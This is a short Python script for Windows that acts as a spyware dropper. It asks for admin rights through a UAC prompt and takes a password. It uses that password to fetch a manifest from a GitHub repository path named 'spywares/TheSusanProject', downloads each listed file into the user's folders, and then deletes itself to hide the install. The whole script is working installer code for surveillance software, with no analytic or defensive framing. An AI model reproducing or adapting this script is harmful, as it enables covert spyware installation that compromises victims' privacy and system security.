import ctypes
import os

try:
	import requests
except:
	os.system("py -m pip install requests")
finally:
	import requests
	
import json
import sys


def is_admin():
	try:
		return ctypes.windll.shell32.IsUserAnAdmin()
	except:
		return False

if not is_admin():
	ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) # It just works idk why
	sys.exit()
	pass


pwd=input("Password: ")
user = os.environ['username']
response = requests.get(f"https://github.com/PVER-Programz/spywares/raw/main/TheSusanProject/f{pwd}.json")
inidata = json.loads(response.text)


for x in inidata:
	response = requests.get(x)
	code = response.content
	filepath = inidata[x].replace("<username>", user)+"/"+x.split("/")[-1]
	if not os.path.exists(os.path.dirname(filepath)):
		os.makedirs(os.path.dirname(filepath))
	with open(filepath, 'wb') as f:
		f.write(code)

os.remove(__file__)